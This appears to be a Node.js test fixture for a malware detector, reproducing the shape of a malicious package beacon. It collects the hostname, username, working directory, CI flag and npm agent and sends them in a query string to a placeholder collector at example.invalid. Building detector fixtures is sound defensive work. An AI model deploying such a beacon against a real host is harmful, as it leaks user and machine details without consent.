// STRUCTURAL REPRODUCTION for detector testing. Collector is a fake domain and
// this file is never executed by the fixture. It mirrors the shape only.
const os = require("os");
const https = require("https");
const info = {
  host: os.hostname(),
  user: os.userInfo().username,
  cwd: process.cwd(),
  platform: process.platform,
  node: process.version,
  ci: process.env.CI,
  ua: process.env.npm_config_user_agent,
};
const qs = new URLSearchParams(info).toString();
const url = "https://example.invalid/collector/dc?" + qs;
https.get(url, () => {});
